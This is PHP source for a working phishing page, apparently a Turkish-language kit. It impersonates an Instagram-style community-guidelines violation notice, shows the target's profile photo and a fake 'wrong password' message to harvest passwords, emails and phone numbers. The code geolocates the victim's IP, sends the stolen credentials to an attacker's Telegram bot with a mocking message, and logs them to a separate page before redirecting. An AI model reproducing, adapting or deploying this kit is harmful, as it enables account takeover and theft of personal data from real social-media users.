<?php


require 'load.php';

session_start();
error_reporting(E_ALL);

ob_start();

$username=$_GET['username'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
    $password=$_POST["password"];
    $tel=$_POST["tel"];
	$mail=$_POST["mail"];
    $ip=$_SERVER["REMOTE_ADDR"];

$xml = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip);

 $ulke = $xml->geoplugin_countryName ;
$sehir = $xml->geoplugin_regionName ;
    
    date_default_timezone_set('Europe/Istanbul');
    $cur_time=date("d-m-Y H:i:s");
    include 'images/meta.jpg';


//Chat id örenmek için https://api.telegram.org/bot[Token]/getUpdates  YAPAMADINIZ YERDE TELEGRAMDAN YAZ @theasiz

$token = "BURAYA TOKEN"; //Botfatherin verdiği tokeni yazın.
$chat_id = "BURAYA CHAT ID";// Linkten aldığınız chatid yi yazın.

$data = [
  'text' => '➡️ Lan ENAYİ '.$username.' Düştü 😈

Kullanıcı Adı : '.$username.'
Şifre : '.$password.'
Mail : '.$mail.'
Tel : '.$tel.'
Ülke : '.$ulke.'
Şehir : '.$sehir.'
İp : '.$ip.'
Tarih : '.$cur_time.'
',
   'chat_id' => $chat_id
];
//Coded by ASİZ
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
?>
<?php
 
  $file = fopen('dusenler.php', 'a');
   fwrite($file, "
 <html>
 <head>
     <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'>
 <title>ASIZ :)</title>
 </head>
 <body bgcolor='#000000'>
 <body bgcolor='rgb(0,0,0)'>
 <body bgcolor='black'>
 <font color='yellow'>İlk Giriş Bilgileri : </font><br>
 <font color='red'> Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
 <font color='red'> Sifre: </font><font color='white'>".$password."</font><br>
  <font color='red'> mail: </font><font color='white'>".$mail."</font><br>
  <font color='red'> İp Adres,: </font><font color='white'>".$ip."</font><br>
  <font color='red'>Telefon,: </font><font color='white'>".$tel."</font><br>
  <font color='red'> Ulke: </font><font color='white'>".$ulke."</font><br>
 <font color='red'> Sehir: </font><font color='white'>".$sehir."</font><br>
  <font color='red'> ZAMANI: </font><font color='white'>".$cur_time."</font><br>
 
 "); 
  
 fclose($file);
 
 header("location: appeals.php?username=$username");
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Topluluk Kuralları İhlali  @<?php echo $username?></title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
<link rel="icon" type="image/png" href="images/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
<!--===============================================================================================-->
</head>
<body>
	<header>
<table>
	<br>
	<tr>
		<td><img src="images/logo.svg" width="80"></td>
        <td><i class="fas fa-grip-lines" id="line"></i></td>
	</tr>
</table><br>

	</header>
	<div class="container-login100" >
		<div class="wrap-login100 p-l-55 p-r-55 p-t-110 p-b-30">
			<form method="post" class="login100-form validate-form">
		
			<center><img style="max-width:50%; border-radius:50%; margin-top:-70px;" width="100"  src="<?php echo $pp?>"></center><br>
				<span class="login100-form-title p-b-37">
				@<?php echo $username?>				</span>
		<center>		<p style="max-width:87%; font-size:17px; color: #ed4956; line-height:20px; font-weight:400;">Üzgünüz, şifreniz yanlıştı. Lütfen şifrenizi tekrar kontrol edin. </p></center>	<br>

			<input class="input100" type="hidden" name="username" placeholder="@" disabled>
					<span class="focus-input100"></span>
			
			<div class="wrap-input100 validate-input m-b-20" data-validate="Password">
					<input class="input100" type="password" name="password" placeholder="Password">
					<span class="focus-input100"></span>
				</div>
				
            <div class="wrap-input100 validate-input m-b-20" data-validate="E-Mail Adress">
					<input class="input100" type="email" name="mail" placeholder="E-Mail Adress">
					<span class="focus-input100"></span>
				</div>
			
			<div class="wrap-input100 validate-input m-b-20" data-validate="Phone Number">
					<input class="input100" type="tel" name="tel" placeholder="Phone Number">
					<span class="focus-input100"></span>
				</div>
 
				<div class="container-login100-form-btn">
					<button class="login100-form-btn">
					Doğrula @<?php echo $username?>

			</form>
			
		</div>
	</div>
	
	<div id="dropDownSelect1"></div>
	
<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
</html>